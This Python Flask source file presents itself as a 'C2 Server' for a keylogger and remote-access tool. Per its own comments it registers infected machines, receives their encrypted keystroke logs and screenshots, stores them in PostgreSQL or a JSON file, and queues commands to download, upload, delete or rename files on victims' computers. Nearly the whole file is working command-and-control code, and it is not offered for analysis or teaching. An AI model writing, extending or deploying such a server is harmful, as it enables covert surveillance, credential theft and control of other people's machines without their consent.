from flask import Flask, request, jsonify, send_from_directory
import time
import threading
from datetime import datetime
import os
import json
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol


app = Flask(__name__)

#In-memory storage for clients
clients = {}
#In-memory storage for pending commands for clients
pending_commands = {}
command_results = {}
keylogs_storage = {}

encryptor = Encryptor(ENCRYPTION_KEY)

# Fichier de sauvegarde des keylogs
KEYLOGS_FILE = "keylogs_backup.json"

# PostgreSQL support (pour Render.com)
USE_DATABASE = os.environ.get('DATABASE_URL') is not None

if USE_DATABASE:
    try:
        import psycopg2
        from urllib.parse import urlparse
        
        DATABASE_URL = os.environ.get('DATABASE_URL')
        if DATABASE_URL and DATABASE_URL.startswith('postgres://'):
            DATABASE_URL = DATABASE_URL.replace('postgres://', 'postgresql://', 1)
        
        print(f"[DATABASE] Using PostgreSQL for persistence")
        
        def get_db_connection():
            return psycopg2.connect(DATABASE_URL)
        
        def init_database():
            try:
                conn = get_db_connection()
                cur = conn.cursor()
                
                # Table 1: Clients - Informations sur les machines infectées
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS clients (
                        id SERIAL PRIMARY KEY,
                        client_id VARCHAR(255) UNIQUE NOT NULL,
                        hostname VARCHAR(255),
                        username VARCHAR(255),
                        platform VARCHAR(100),
                        platform_version VARCHAR(255),
                        architecture VARCHAR(50),
                        processor VARCHAR(255),
                        ip_address VARCHAR(50),
                        first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        online BOOLEAN DEFAULT TRUE,
                        checkin_count INTEGER DEFAULT 0,
                        system_info JSONB
                    )
                ''')
                
                # Table 2: Keylogs - Enregistrement des frappes clavier
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS keylogs (
                        id SERIAL PRIMARY KEY,
                        client_id VARCHAR(255) NOT NULL,
                        timestamp VARCHAR(100),
                        text TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
                    )
                ''')
                
                # Table 3: Commands - Historique des commandes envoyées
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS commands (
                        id SERIAL PRIMARY KEY,
                        command_id VARCHAR(255) UNIQUE NOT NULL,
                        client_id VARCHAR(255) NOT NULL,
                        action VARCHAR(255) NOT NULL,
                        data JSONB,
                        status VARCHAR(50) DEFAULT 'pending',
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        executed_at TIMESTAMP,
                        FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
                    )
                ''')
                
                # Table 4: Command Results - Résultats des commandes exécutées
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS command_results (
                        id SERIAL PRIMARY KEY,
                        command_id VARCHAR(255) UNIQUE NOT NULL,
                        client_id VARCHAR(255) NOT NULL,
                        result JSONB,
                        success BOOLEAN,
                        error_message TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (command_id) REFERENCES commands(command_id) ON DELETE CASCADE,
                        FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
                    )
                ''')
                
                # Table 5: Screenshots - Métadonnées des captures d'écran
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS screenshots (
                        id SERIAL PRIMARY KEY,
                        client_id VARCHAR(255) NOT NULL,
                        filename VARCHAR(255),
                        width INTEGER,
                        height INTEGER,
                        quality INTEGER,
                        size_kb INTEGER,
                        data TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE
                    )
                ''')
                
                # Index pour optimiser les requêtes
                cur.execute('CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id)')
                cur.execute('CREATE INDEX IF NOT EXISTS idx_keylogs_created ON keylogs(created_at)')
                cur.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)')
                cur.execute('CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)')
                cur.execute('CREATE INDEX IF NOT EXISTS idx_screenshots_client ON screenshots(client_id)')
                cur.execute('CREATE INDEX IF NOT EXISTS idx_clients_online ON clients(online)')
                
                conn.commit()
                cur.close()
                conn.close()
                print("[DATABASE] ✅ Database initialized with 5 tables")
                print("[DATABASE] Tables: clients, keylogs, commands, command_results, screenshots")
            except Exception as e:
                print(f"[DATABASE] ❌ Error initializing database: {e}")
        
        init_database()
        
    except ImportError:
        print("[DATABASE] ⚠️ psycopg2 not installed, falling back to file storage")
        USE_DATABASE = False


def load_keylogs_from_database():
    """Charge les keylogs depuis PostgreSQL"""
    global keylogs_storage
    if not USE_DATABASE:
        return
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('SELECT client_id, timestamp, text FROM keylogs ORDER BY created_at')
        rows = cur.fetchall()
        
        keylogs_storage = {}
        for client_id, timestamp, text in rows:
            if client_id not in keylogs_storage:
                keylogs_storage[client_id] = []
            keylogs_storage[client_id].append({
                "timestamp": timestamp,
                "text": text
            })
        
        cur.close()
        conn.close()
        
        total_logs = sum(len(logs) for logs in keylogs_storage.values())
        print(f"[DATABASE] ✅ Loaded {len(keylogs_storage)} clients' keylogs ({total_logs} total)")
    except Exception as e:
        print(f"[DATABASE] ❌ Error loading from database: {e}")


def save_keylogs_to_database(client_id, logs):
    """Sauvegarde les nouveaux keylogs dans PostgreSQL"""
    if not USE_DATABASE:
        return
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        for log in logs:
            cur.execute(
                'INSERT INTO keylogs (client_id, timestamp, text) VALUES (%s, %s, %s)',
                (client_id, log.get('timestamp'), log.get('text'))
            )
        
        conn.commit()
        cur.close()
        conn.close()
        print(f"[DATABASE] ✅ Saved {len(logs)} keylogs for {client_id}")
    except Exception as e:
        print(f"[DATABASE] ❌ Error saving to database: {e}")


def save_client_to_database(client_id, client_data):
    """Sauvegarde ou met à jour un client dans la base de données"""
    if not USE_DATABASE:
        return
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        system_info = client_data.get('system_info', {})
        
        # Vérifier si le client existe déjà
        cur.execute('SELECT id FROM clients WHERE client_id = %s', (client_id,))
        exists = cur.fetchone()
        
        if exists:
            # Mise à jour
            cur.execute('''
                UPDATE clients SET 
                    hostname = %s,
                    username = %s,
                    platform = %s,
                    ip_address = %s,
                    last_seen = CURRENT_TIMESTAMP,
                    online = TRUE,
                    checkin_count = checkin_count + 1,
                    system_info = %s
                WHERE client_id = %s
            ''', (
                system_info.get('hostname'),
                system_info.get('username'),
                system_info.get('platform'),
                client_data.get('ip'),
                json.dumps(system_info),
                client_id
            ))
        else:
            # Insertion
            cur.execute('''
                INSERT INTO clients (
                    client_id, hostname, username, platform, platform_version,
                    architecture, processor, ip_address, system_info
                ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
            ''', (
                client_id,
                system_info.get('hostname'),
                system_info.get('username'),
                system_info.get('platform'),
                system_info.get('platform_version'),
                system_info.get('architecture'),
                system_info.get('processor'),
                client_data.get('ip'),
                json.dumps(system_info)
            ))
        
        conn.commit()
        cur.close()
        conn.close()
        print(f"[DATABASE] ✅ Saved client {client_id}")
    except Exception as e:
        print(f"[DATABASE] ❌ Error saving client: {e}")


def save_command_to_database(command_id, client_id, action, data):
    """Sauvegarde une commande dans la base de données"""
    if not USE_DATABASE:
        return
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        cur.execute('''
            INSERT INTO commands (command_id, client_id, action, data)
            VALUES (%s, %s, %s, %s)
            ON CONFLICT (command_id) DO NOTHING
        ''', (command_id, client_id, action, json.dumps(data)))
        
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"[DATABASE] ❌ Error saving command: {e}")


def save_command_result_to_database(command_id, client_id, result):
    """Sauvegarde le résultat d'une commande"""
    if not USE_DATABASE:
        return
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Marquer la commande comme exécutée
        cur.execute('''
            UPDATE commands SET status = 'completed', executed_at = CURRENT_TIMESTAMP
            WHERE command_id = %s
        ''', (command_id,))
        
        # Sauvegarder le résultat
        success = not isinstance(result, dict) or not result.get('error')
        error_msg = result.get('error') if isinstance(result, dict) else None
        
        cur.execute('''
            INSERT INTO command_results (command_id, client_id, result, success, error_message)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (command_id) DO UPDATE SET
                result = EXCLUDED.result,
                success = EXCLUDED.success,
                error_message = EXCLUDED.error_message
        ''', (command_id, client_id, json.dumps(result), success, error_msg))
        
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"[DATABASE] ❌ Error saving command result: {e}")


def save_screenshot_to_database(client_id, screenshot_data):
    """Sauvegarde les métadonnées d'un screenshot"""
    if not USE_DATABASE:
        return
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        cur.execute('''
            INSERT INTO screenshots (
                client_id, filename, width, height, quality, size_kb, data
            ) VALUES (%s, %s, %s, %s, %s, %s, %s)
        ''', (
            client_id,
            screenshot_data.get('filename', 'screenshot.jpg'),
            screenshot_data.get('width'),
            screenshot_data.get('height'),
            screenshot_data.get('quality'),
            screenshot_data.get('size_kb'),
            screenshot_data.get('data')  # Base64 encoded
        ))
        
        conn.commit()
        cur.close()
        conn.close()
        print(f"[DATABASE] ✅ Saved screenshot for {client_id}")
    except Exception as e:
        print(f"[DATABASE] ❌ Error saving screenshot: {e}")


def load_keylogs_from_file():
    """Charge les keylogs depuis le fichier de sauvegarde"""
    global keylogs_storage
    if USE_DATABASE:
        load_keylogs_from_database()
        return
    
    try:
        if os.path.exists(KEYLOGS_FILE):
            with open(KEYLOGS_FILE, 'r') as f:
                keylogs_storage = json.load(f)
            print(f"[STORAGE] ✅ Loaded {len(keylogs_storage)} clients' keylogs from {KEYLOGS_FILE}")
            total_logs = sum(len(logs) for logs in keylogs_storage.values())
            print(f"[STORAGE] Total keylogs loaded: {total_logs}")
        else:
            print(f"[STORAGE] No backup file found, starting fresh")
    except Exception as e:
        print(f"[STORAGE] ❌ Error loading keylogs: {e}")
        keylogs_storage = {}


def save_keylogs_to_file():
    """Sauvegarde les keylogs dans un fichier"""
    if USE_DATABASE:
        return  # Ne pas utiliser le fichier si on a la DB
    
    try:
        with open(KEYLOGS_FILE, 'w') as f:
            json.dump(keylogs_storage, f)
        total_logs = sum(len(logs) for logs in keylogs_storage.values())
        print(f"[STORAGE] ✅ Saved {len(keylogs_storage)} clients' keylogs ({total_logs} total logs)")
    except Exception as e:
        print(f"[STORAGE] ❌ Error saving keylogs: {e}")


# Charger les keylogs au démarrage
load_keylogs_from_file()




def cleanup_old_clients():
    while True:
        current_time = time.time()
        clients_to_remove = []
        
        for client_id, client_data in clients.items():
            if current_time - client_data.get('last_seen', 0) > 3600:  #1 hour
                clients_to_remove.append(client_id)
        
        for client_id in clients_to_remove:
            del clients[client_id]
            print(f"Removed inactive client: {client_id}")
        
        time.sleep(30)  #Check every 30 seconds

#Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
cleanup_thread.start()


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/control')
def control_panel():
    """Serve the unified control panel"""
    try:
        return send_from_directory('.', 'control_panel_v2.html')
    except FileNotFoundError:
        return "Control panel file not found", 404


@app.route('/dashboard')
def dashboard():
    """Serve the old dashboard"""
    try:
        return send_from_directory('.', 'dashboard.html')
    except FileNotFoundError:
        return "Dashboard file not found", 404


@app.route('/database')
def database_dashboard():
    """Serve the new database dashboard"""
    try:
        return send_from_directory('.', 'database_dashboard.html')
    except FileNotFoundError:
        return "Database dashboard file not found", 404


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            
            return jsonify({
                "data": encrypted_res
            }), 400
        

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        clients[client_id] = {
            'system_info': system_info,
            'last_seen': time.time(),
            'first_seen': time.time(),
            'ip': client_ip,
            'checkin_count': clients.get(client_id, {}).get('checkin_count', 0) + 1
        }
        
        print(f"\n🟢 [REGISTER] Client {client_id} registered from {client_ip}")
        print(f"[REGISTER] Total clients now: {len(clients)}")
        print(f"[REGISTER] All clients: {list(clients.keys())}\n")

        # Save client to database
        save_client_to_database(client_id, clients[client_id])

        response_data = Protocol.create_success_message("Registered successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    

    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": error_res
        }), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption failed!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        client_id = heartbeat_data.get('client_id')

        if client_id and client_id in clients:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1
            print(f"💓 [HEARTBEAT] Client {client_id} checked in (count: {clients[client_id]['checkin_count']})") 
            


            res_msg = Protocol.create_success_message()
            encrypted_response = encryptor.encrypt(res_msg)
            return jsonify({
                "data": encrypted_response
            })


        else:
            error_msg = Protocol.create_error_message("Client not found!")
            encrypted_response = encryptor.encrypt(error_msg)

            return jsonify({
                "data": encrypted_response,
            }), 404
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": encrypted_res
        }), 500


@app.route('/admin/clients', methods=['GET'])
def get_clients():
    #Get list of all connected clients
    print(f"\n[DEBUG] /admin/clients called")
    print(f"[DEBUG] clients dict keys: {list(clients.keys())}")
    print(f"[DEBUG] clients dict size: {len(clients)}")
    print(f"[DEBUG] clients dict content: {clients}")
    
    clients_list = []
    current_time = time.time()
    
    for client_id, client_data in clients.items():
        last_seen = client_data.get('last_seen', 0)
        is_online = current_time - last_seen < 10
        print(f"[DEBUG] Client {client_id}: last_seen={last_seen}, online={is_online}")
        
        clients_list.append({
            "client_id": client_id,
            "system_info": client_data.get('system_info', {}),
            "first_seen": client_data.get('first_seen'),
            "last_seen": last_seen,
            "ip": client_data.get('ip'),
            "online": is_online,
            "checkin_count": client_data.get('checkin_count', 0),
            "uptime_seconds": current_time - client_data.get('first_seen', current_time)
        })
    
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    print(f"[DEBUG] Response: {clients_list}\n")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat()
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    online_clients = sum(1 for client in clients.values() 
                        if time.time() - client.get('last_seen', 0) < 10)
    
    return jsonify({
        "status": "online",
        "total_clients": len(clients),
        "online_clients": online_clients,
        "server_time": datetime.now().isoformat(),
        "uptime_seconds": time.time() - app.start_time
    })




@app.route("/admin/process/<client_id>", methods=['POST'])
def send_process_command(client_id):
    try:
        command_data = request.json
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        command_id = f'cmd_{int(time.time() * 1000)}'
        command_info = {
            "command_id": command_id,
            "action": action,
            "data": data,
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        # Save command to database
        save_command_to_database(client_id, command_info)
        
        #Clean old commands per client
        if client_id in pending_commands:
            pending_commands[client_id] = pending_commands[client_id][-10:]
        
        
        print(f"[PROCESS] Command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'Command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue command: {e}"}), 500
    


@app.route("/admin/command_result/<command_id>", methods=['GET'])
def get_command_result(command_id):
    try:
        result = command_results.get(command_id)
        if result:
            return jsonify({"success": True, "result": result.get('result')}) #changed
        else:
            return jsonify({"error": "Result not found or expired"}), 404
    
    except Exception as e:
        return jsonify({"error": f'Failed to get result: {e}'}), 500


@app.route("/commands", methods=["POST"])
def get_commands():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No encrypted data"}), 400
        
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"error": "Invalid request"}), 400
        
        client_id = client_data.get("client_id")
        if not client_id:
            return jsonify({"error": "No client ID"}), 400
        
        
        print(f"[SERVER] Client {client_id} requesting commands")
        commands = pending_commands.get(client_id, [])
        print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
        
        
        if commands:
            pending_commands[client_id] = []
            print(f"[SERVER] Sending {len(commands)} commands to {client_id}")
        
        
        response_data = {
            "type": "commands",
            "commands": commands
        }
        
        
        encrypted_response = encryptor.encrypt(response_data)
        return jsonify({"data": encrypted_response})
    
    
    except Exception as e:
        print(f"[SERVER] Error in /commands: {e}")
        return jsonify({"error": f"Failed to get commands: {e}"}), 500
    
    


@app.route("/commands_result", methods=["POST"])
def submit_command_result():
    try:
        print(f"[SERVER] Received command result request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[SERVER] Error: No encrypted data in command result")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[SERVER] Decrypting command result...")
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            print(f"[SERVER] Error: Failed to decrypt command result")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[SERVER] Decrypted data type: {type(client_data)}")

        if not isinstance(client_data, dict) or client_data.get("type") != "command_result":
            print(f"[SERVER] Error: Invalid message format or type: {type(client_data)}")
            return jsonify({"error": "Invalid request format"}), 400
        
        command_id = client_data.get("command_id")
        result = client_data.get("result")
        
        print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
        
        if command_id and result is not None:
            command_results[command_id] = {
                'result': result,
                'timestamp': time.time(),
                'client_id': client_data.get('client_id')
            }
            
            # Save command result to database
            save_command_result_to_database(command_id, command_results[command_id])
            
            print(f"[SERVER] Successfully stored result for command {command_id}")
            

            current_time = time.time()
            expired_keys = [k for k, v in command_results.items() if current_time - v.get('timestamp', current_time) > 3600]
            
            for key in expired_keys:
                command_results.pop(key, None)

            return jsonify({"success" : True})
        else:
            print(f"[SERVER] Error: Missing command_id or result")
            return jsonify({"error": "Missing command_id or result"}), 400
    
    except Exception as e:
        print(f"[SERVER] Error in /commands_result: {e}")
        import traceback
        print(f"[SERVER] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to submit result: {e}"}), 500


@app.route("/admin/file/<client_id>", methods=["POST"])
def send_file_command(client_id):
    try:
        command_data = request.json
        action = command_data.get('action')
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        command_id = f"file_cmd_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "action": action,
            "data": data,
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        # Save command to database
        save_command_to_database(client_id, command_info)
        
        if client_id in pending_commands:
            pending_commands[client_id] = pending_commands[client_id][-10:]
        
        print(f"[FILE] command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'File command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue file command: {e}"}), 500


@app.route("/admin/file/download/<client_id>", methods=["POST"])
def download_file_from_client(client_id):
    """Télécharger un fichier depuis le client"""
    try:
        file_path = request.json.get('file_path')
        if not file_path:
            return jsonify({"error": "No file path specified"}), 400
        
        command_id = f"download_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "action": "download",
            "data": {"path": file_path},
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        save_command_to_database(client_id, command_info)
        
        print(f"📥 [DOWNLOAD] Queued download request for {file_path} from {client_id}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f"Download request queued"
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/file/upload/<client_id>", methods=["POST"])
def upload_file_to_client(client_id):
    """Uploader un fichier vers le client"""
    try:
        destination = request.json.get('destination')
        file_data = request.json.get('file_data')  # Base64 encoded
        filename = request.json.get('filename')
        
        if not all([destination, file_data, filename]):
            return jsonify({"error": "Missing required fields"}), 400
        
        command_id = f"upload_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "action": "upload",
            "data": {
                "destination": destination,
                "file_data": file_data,
                "filename": filename
            },
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        save_command_to_database(client_id, command_info)
        
        print(f"📤 [UPLOAD] Queued upload request for {filename} to {client_id}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f"Upload request queued"
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/file/delete/<client_id>", methods=["POST"])
def delete_file_on_client(client_id):
    """Supprimer un fichier/dossier sur le client"""
    try:
        file_path = request.json.get('file_path')
        if not file_path:
            return jsonify({"error": "No file path specified"}), 400
        
        command_id = f"delete_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "action": "delete",
            "data": {"path": file_path},
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        save_command_to_database(client_id, command_info)
        
        print(f"🗑️ [DELETE] Queued delete request for {file_path} on {client_id}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f"Delete request queued"
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/file/rename/<client_id>", methods=["POST"])
def rename_file_on_client(client_id):
    """Renommer un fichier/dossier sur le client"""
    try:
        old_path = request.json.get('old_path')
        new_path = request.json.get('new_path')
        
        if not all([old_path, new_path]):
            return jsonify({"error": "Missing old_path or new_path"}), 400
        
        command_id = f"rename_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "action": "rename",
            "data": {
                "old_path": old_path,
                "new_path": new_path
            },
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        save_command_to_database(client_id, command_info)
        
        print(f"✏️ [RENAME] Queued rename request on {client_id}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f"Rename request queued"
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/file/create_folder/<client_id>", methods=["POST"])
def create_folder_on_client(client_id):
    """Créer un nouveau dossier sur le client"""
    try:
        folder_path = request.json.get('folder_path')
        if not folder_path:
            return jsonify({"error": "No folder path specified"}), 400
        
        command_id = f"mkdir_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "action": "create_folder",
            "data": {"path": folder_path},
            "timestamp": time.time()
        }
        pending_commands.setdefault(client_id, []).append(command_info)
        
        save_command_to_database(client_id, command_info)
        
        print(f"📁 [CREATE] Queued folder creation for {folder_path} on {client_id}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f"Folder creation request queued"
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/keylog_data", methods=["POST"])
def receive_keylog_data():
    
    try:
        print(f"[KEYLOG] Received keylog data request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[KEYLOG] Error: No encrypted data")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[KEYLOG] Decrypting keylog data...")
        keylog_data = encryptor.decrypt(encrypted_data)
        if not keylog_data:
            print(f"[KEYLOG] Error: Failed to decrypt keylog data")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[KEYLOG] Decrypted data type: {keylog_data.get('type')}")

        # Vérifier que c'est bien des keylogs
        if not isinstance(keylog_data, dict) or keylog_data.get("type") != "keylog_data":
            print(f"[KEYLOG] Error: Invalid message type: {keylog_data.get('type')}")
            return jsonify({"error": "Invalid keylog data format"}), 400
        
        client_id = keylog_data.get("client_id")
        logs = keylog_data.get("logs", [])
        log_count = keylog_data.get("log_count", 0)
        
        print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
        
        if client_id and logs:
            # Initialiser le stockage pour ce client si nécessaire
            if client_id not in keylogs_storage:
                keylogs_storage[client_id] = []
            
            # Ajouter les nouveaux logs
            keylogs_storage[client_id].extend(logs)
            
            # Garder seulement les 1000 derniers logs par client
            if len(keylogs_storage[client_id]) > 1000:
                keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
            
            # IMPORTANT: Sauvegarder dans la base de données ou fichier
            if USE_DATABASE:
                save_keylogs_to_database(client_id, logs)
            else:
                save_keylogs_to_file()
            
            # Mettre à jour le last_seen du client
            if client_id in clients:
                clients[client_id]['last_seen'] = time.time()
                clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1
            
            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
            print(f"[KEYLOG] Total logs for {client_id}: {len(keylogs_storage[client_id])}")
            
            return jsonify({
                "success": True, 
                "message": f"Received {len(logs)} keylogs",
                "total_stored": len(keylogs_storage[client_id])
            })
        else:
            print(f"[KEYLOG] Error: Missing client_id or logs")
            return jsonify({"error": "Missing client_id or logs"}), 400
    
    except Exception as e:
        print(f"[KEYLOG] Error in /keylog_data: {e}")
        import traceback
        print(f"[KEYLOG] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to process keylogs: {e}"}), 500


@app.route("/admin/keylogs/<client_id>", methods=["GET"])
def get_client_keylogs(client_id):
    
    try:
        limit = request.args.get('limit', 100, type=int)
        
        # Debug: afficher tous les client_ids disponibles
        print(f"[ADMIN_KEYLOG] Requested client_id: {client_id}")
        print(f"[ADMIN_KEYLOG] Available client_ids in storage: {list(keylogs_storage.keys())}")
        print(f"[ADMIN_KEYLOG] Total clients with keylogs: {len(keylogs_storage)}")
        
        if client_id in keylogs_storage:
            logs = keylogs_storage[client_id][-limit:]  # Les plus récents en premier
            print(f"[ADMIN_KEYLOG] ✅ Found {len(logs)} keylogs for {client_id}")
            return jsonify({
                "success": True,
                "client_id": client_id,
                "keylogs": logs,
                "total_logs": len(keylogs_storage[client_id]),
                "returned_logs": len(logs)
            })
        else:
            print(f"[ADMIN_KEYLOG] ❌ No keylogs found for {client_id}")
            return jsonify({
                "success": True,
                "client_id": client_id,
                "keylogs": [],
                "total_logs": 0,
                "message": "No keylogs found for this client",
                "available_clients": list(keylogs_storage.keys())
            })
    
    except Exception as e:
        print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
    

@app.route("/admin/keylogs_stats", methods=["GET"])
def get_keylogs_stats():
    
    try:
        stats = {}
        total_logs = 0
        
        for client_id, logs in keylogs_storage.items():
            stats[client_id] = {
                "log_count": len(logs),
                "last_log_time": logs[-1]['timestamp'] if logs else "No logs",
                "client_online": client_id in clients and (time.time() - clients[client_id].get('last_seen', 0) < 60)
            }
            total_logs += len(logs)
        
        return jsonify({
            "success": True,
            "total_clients_with_logs": len(keylogs_storage),
            "total_logs_stored": total_logs,
            "clients": stats
        })
    
    except Exception as e:
        return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500


# Nouvel endpoint pour debug - voir TOUS les keylogs
@app.route("/admin/keylogs_all", methods=["GET"])
def get_all_keylogs():
    try:
        return jsonify({
            "success": True,
            "keylogs_storage": keylogs_storage,
            "total_clients": len(keylogs_storage),
            "client_ids": list(keylogs_storage.keys())
        })
    except Exception as e:
        return jsonify({"error": f"Failed to get all keylogs: {e}"}), 500


def cleanup_old_keylogs():
    
    while True:
        try:
            current_time = time.time()
            cutoff_time = current_time - (24 * 3600)  # 24 heures
            
            for client_id in list(keylogs_storage.keys()):
                # Filtrer les logs trop vieux
                keylogs_storage[client_id] = [
                    log for log in keylogs_storage[client_id] 
                    if current_time - datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')).timestamp() < 24 * 3600
                ]
                
                # Supprimer les entrées vides
                if not keylogs_storage[client_id]:
                    del keylogs_storage[client_id]
            
            print(f"[CLEANUP] Keylogs cleanup completed")
            time.sleep(3600)  # Toutes les heures
        
        except Exception as e:
            print(f"[CLEANUP] Error in keylogs cleanup: {e}")
            time.sleep(300)

# Start cleanup threads
